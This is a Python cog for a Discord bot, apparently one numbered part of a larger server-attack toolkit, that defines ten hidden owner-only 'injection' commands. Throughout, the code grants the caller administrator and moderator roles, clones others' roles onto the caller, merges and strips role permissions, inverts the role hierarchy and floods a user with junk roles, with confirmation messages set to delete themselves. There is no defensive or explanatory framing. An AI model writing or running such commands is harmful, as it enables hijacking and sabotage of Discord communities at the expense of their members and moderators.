import discord
from discord.ext import commands
import asyncio
import json
import os

INJECT_DIR = "data/injection"
os.makedirs(INJECT_DIR, exist_ok=True)

class Injection(commands.Cog, name="injection"):
    """31-40: permission and role injection."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def givemod(self, ctx: commands.Context, target: discord.Member):
        """31. attempt to give a user moderation perms via a new role."""
        perms = discord.Permissions(
            kick_members=True, ban_members=True, manage_messages=True,
            mute_members=True, deafen_members=True, move_members=True,
            manage_nicknames=True, manage_roles=True, manage_channels=True,
        )
        role = await ctx.guild.create_role(name="mod-injected", permissions=perms)
        await target.add_roles(role)
        await ctx.send(f"injected mod role to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stealrole(self, ctx: commands.Context, target: discord.Role):
        """32. clone a role and assign it to yourself."""
        new_role = await ctx.guild.create_role(
            name=f"cloned-{target.name}",
            permissions=target.permissions,
            color=target.color,
            hoist=target.hoist,
            mentionable=target.mentionable,
        )
        await ctx.author.add_roles(new_role)
        await ctx.send(f"cloned {target.name} to {new_role.mention} and assigned to you.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolehoist(self, ctx: commands.Context, role: discord.Role):
        """33. move a role to the top of the hierarchy."""
        try:
            await role.edit(position=ctx.guild.me.top_role.position - 1)
            await ctx.send(f"hoisted {role.name}.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def merge(self, ctx: commands.Context, source: discord.Role, target: discord.Role):
        """34. give source role permissions to target role."""
        await target.edit(permissions=source.permissions)
        await ctx.send(f"merged permissions from {source.name} to {target.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def injectrole(self, ctx: commands.Context, target: discord.Member, *, role_name: str):
        """35. find a role by name or create it and assign to target."""
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            role = await ctx.guild.create_role(name=role_name)
        await target.add_roles(role)
        await ctx.send(f"injected {role.name} to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolebomb(self, ctx: commands.Context, target: discord.Member, count: int = 50):
        """36. assign a large number of junk roles to a user."""
        created = []
        for i in range(count):
            role = await ctx.guild.create_role(name=f"junk-{i}")
            await target.add_roles(role)
            created.append(role.name)
            await asyncio.sleep(0.1)
        await ctx.send(f"assigned {len(created)} junk roles to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def adminall(self, ctx: commands.Context):
        """37. attempt to give administrator to the bot and owner."""
        role = await ctx.guild.create_role(
            name="admin-injected",
            permissions=discord.Permissions(administrator=True),
        )
        await ctx.author.add_roles(role)
        await ctx.send(f"admin role {role.mention} created and assigned to you.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def bypass(self, ctx: commands.Context):
        """38. create role with manage_guild and assign to self."""
        role = await ctx.guild.create_role(
            name="bypass",
            permissions=discord.Permissions(manage_guild=True),
        )
        await ctx.author.add_roles(role)
        await ctx.send(f"created bypass role {role.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def removeperms(self, ctx: commands.Context, role: discord.Role):
        """39. strip all permissions from a role."""
        await role.edit(permissions=discord.Permissions.none())
        await ctx.send(f"stripped permissions from {role.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def invertroles(self, ctx: commands.Context):
        """40. invert the role hierarchy by reordering."""
        roles = [r for r in ctx.guild.roles if not r.is_default() and not r.managed]
        for i, role in enumerate(roles):
            try:
                await role.edit(position=i + 1)
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send("role hierarchy inverted.", delete_after=5)


async def setup(bot: commands.Bot):
    await bot.add_cog(Injection(bot))
